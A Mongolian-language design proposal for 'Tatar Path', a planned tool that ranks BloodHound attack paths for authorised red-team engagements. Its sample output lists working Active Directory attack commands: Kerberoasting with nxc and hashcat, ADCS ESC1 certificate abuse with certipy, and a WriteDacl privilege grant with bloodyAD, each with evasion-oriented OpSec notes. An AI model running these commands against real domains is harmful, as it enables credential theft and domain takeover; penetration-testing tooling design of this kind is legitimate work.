01Асуудал

BloodHound хүчтэй ч гэсэн операторт хэт их ачаалал өгдөг. Гол өвдөлтүүд:

Хэт ерөнхий

“Бүх зам” харагдана. Аль нь хамгийн эхэнд хийх ёстой, аль нь дэмий вэ гэдэг тодорхойгүй.

Hop тоогоор эрэмбэлдэг

Shortest path зөвхөн үсрэлтийн тоог хардаг — бодит хялбар/чимээгүй байдлыг тооцдоггүй.

“Start here” алга

Эзэмшсэн байрлалаасаа хамааран “одоо яг юуг довтлох вэ” гэдгийг зааж өгдөггүй.

Граф ≠ үйлдэл

Зам харуулна, гэхдээ тухайн орчны нэрсээр бэлэн команд болгож өгдөггүй. Оператор гараар угсарна.

02Шийдэл — нэг өгүүлбэрээр

Tatar Path бол BloodHound-ийн датаг уншиж, ирмэг бүрийг бодит exploitability-ээр жинлээд, эзэмшсэн олонлогоос хамгийн бага зардлын замыг олж, “эхлээд энэ N цэгийг довтол” гэсэн эрэмбэтэй жагсаалтыг тухайн орчны нэрсээр бөглөсөн бэлэн командтайгаар гаргадаг triage давхарга.

03Ялгарах шаантаг

Шударгаар: граф цуглуулах, хадгалах, статикаар эрэмбэлэх нь аль хэдийн шийдэгдсэн. Tatar Path-ийн шинэлэг тал өөр давхаргад байна.

Энэ БИШ (commodity)

Цуглуулга (SharpHound) ба хадгалалт (Neo4j)-ыг дахин зохиохгүй. Графыг зурах, бүх замыг жагсаах, статик тайлан гаргах ч бас биш — зөвхөн reasoning давхаргыг нэмнэ.

Эзэмшсэн олонлогт суурилсан “дараагийн алхам”

“Би X-г эзэмшсэн → дараа нь ЯГ Y” гэж динамикаар ганц дараагийн хамгийн зөв алхмыг өгнө. Статик бус.

Орчны нэрсээр бөглөсөн бэлэн команд

Граф → playbook. Бодит объектын нэртэй nxc/certipy/Rubeus команд + OpSec тэмдэглэл.

Офлайн, Монгол, Tatar экосистем

Reasoning-ийг локал Ollama-гаар офлайн ажиллуулж, операторын гаралтыг Монголоор өгнө.

06Гаралтын жишээ

Оператор “би JDOE-г эзэмшсэн” гэж өгөхөд Tatar Path ийм гаралт өгнө. Гаралт нь санал — Tatar Path өөрөө довтлохгүй, оператор баталгаажуулж гүйцэтгэнэ.

# Tatar Path — Эхлэх цэг (owned: JDOE@corp.local → зорилт: Tier Zero)

[1] Kerberoast · SVC_SQL01  # Effort:Бага Noise:Бага Reliability:Дунд
    зам: JDOE → (MemberOf) IT_Staff → (Kerberoastable) SVC_SQL01 → (AdminTo) SQL01
    nxc ldap dc01 -u JDOE -p '***' --kerberoasting roast.txt
    hashcat -m 13100 roast.txt rockyou.txt
    OpSec: TGS хүсэлт — event 4769, бага чимээтэй.

[2] ADCS ESC1 · Template "User"  # Effort:Дунд Impact:Өндөр
    зам: JDOE → (Enroll) VulnTemplate → (ESC1) → Domain Admin
    certipy find -u JDOE@corp.local -p '***' -dc-ip 10.0.0.1
    certipy req -u JDOE ... -template User -upn administrator@corp.local
    OpSec: CA дээр лог үлдэнэ — дунд чимээтэй.

[3] ACL · WriteDacl on GROUP "Helpdesk"  # Effort:Дунд Reliability:Өндөр
    зам: JDOE → (WriteDacl) Helpdesk → (MemberOf) → Server admins
    bloodyAD --host dc01 -u JDOE -p '***' add genericAll Helpdesk JDOE
    OpSec: DACL өөрчлөлт — 5136 идэвхтэй бол мэдэгдэнэ.

Дээрх dc01, corp.local, 10.0.0.1, -p '***' нь зөвхөн жишээ агуулга — бодит гаралтад engagement-ийн бодит нэрсээр бөглөгдөнө.

07MVP хүрээ

  1. Neo4j (BloodHound дата) руу холбогдох — read-only Cypher.
  2. Оператороос “owned” олонлог авах (нэг эсвэл хэд хэдэн объект).
  3. Owned → Tier Zero хүртэлх замуудыг татаж, ирмэгийн жинлэлтээр эрэмбэлэх.
  4. Эхний 5 “эхлэх цэг”-ийг зам + бэлэн команд + OpSec-тэйгээр CLI дээр хэвлэх.
  5. (Дараа нь) Ollama reasoner — false path шүүх, тайлбар Монголоор өгөх.

Цуглуулга (SharpHound), хадгалалт (Neo4j)-ыг дахин зохиохгүй — зөвхөн reasoning + гаралтын давхаргыг л барина. Python + neo4j driver дээр эхэлж болно.

09Экосистем ба хүрээ

Tatar багана бүр “чамд X бэлэн байна → хаанаас эхлэх/юунд анхаарах вэ” гэсэн нэг хэв маягтай:

Triage  → Logs байна      → юу харах вэ
Kuber   → Findings байна   → юунд итгэх вэ
Path    → Paths байна      → алинаас эхлэх вэ
Flow    → Requests байна   → ямар функцийг ямар контекстээр тестлэх вэ
Relay   → Protocol         → хэрхэн харилцах вэ

Хүрээ ба анхааруулга. Tatar Path бол triage давхарга — довтолгооны хэрэгсэл биш:

① Өөрөө гүйцэтгэхгүй. Эрэмбэлсэн саналууд ба бэлэн командыг хэвлэнэ; командыг оператор өөрөө хянаж, өөрөө гүйцэтгэнэ. Авто-exploit болговол ердийн scanner-ууд руу орж, өвөрмөц чанараа алдана.

② Зөвхөн бичгээр зөвшөөрөгдсөн engagement-д. owned олонлогыг оператор өөрөө мэдүүлнэ — Tatar Path түүнийг олж авахгүй, шалгахгүй. Зөвшөөрлийн хүрээ, зорилтот домэйн, хугацааг engagement-ийн баримт тодорхойлно.

③ Гаралт нь баталгаа биш. Жинлэлт бол эвристик — false path гарна. §06-ийн dc01/-p '***' зэрэг нь жишээ placeholder. Оператор эрэмбийг мэргэжлийн шүүлтээрээ дахин үнэлнэ.
